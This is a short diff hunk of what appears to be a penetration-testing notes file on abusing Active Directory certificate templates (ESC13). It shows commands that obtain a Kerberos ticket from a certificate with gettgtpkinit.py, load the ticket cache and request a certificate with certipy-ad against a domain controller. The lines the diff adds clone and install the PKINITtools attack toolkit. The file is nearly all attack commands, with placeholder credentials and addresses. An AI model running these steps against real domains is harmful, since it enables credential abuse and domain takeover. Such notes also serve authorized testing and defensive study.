@@ -31,3 +31,10 @@ python3 gettgtpkinit.py -cert-pfx ESC13TemplateName.pfx domain.local/user user.c
 export KRB5CCNAME=user.ccache
 
 certipy-ad req -u user@domain.local -p 'Password' -target <HOSTNAME_OR_IP> -target-ip 192.168.1.50 -dc-ip 192.168.1.10 -template User -key-size 4096
+
+git clone https://github.com/dirkjanm/PKINITtools.git
+cd PKINITtools
+python3 -m venv .venv
+source .venv/bin/activate
+pip install -r requirements.txt
+python3 gettgtpkinit.py -h
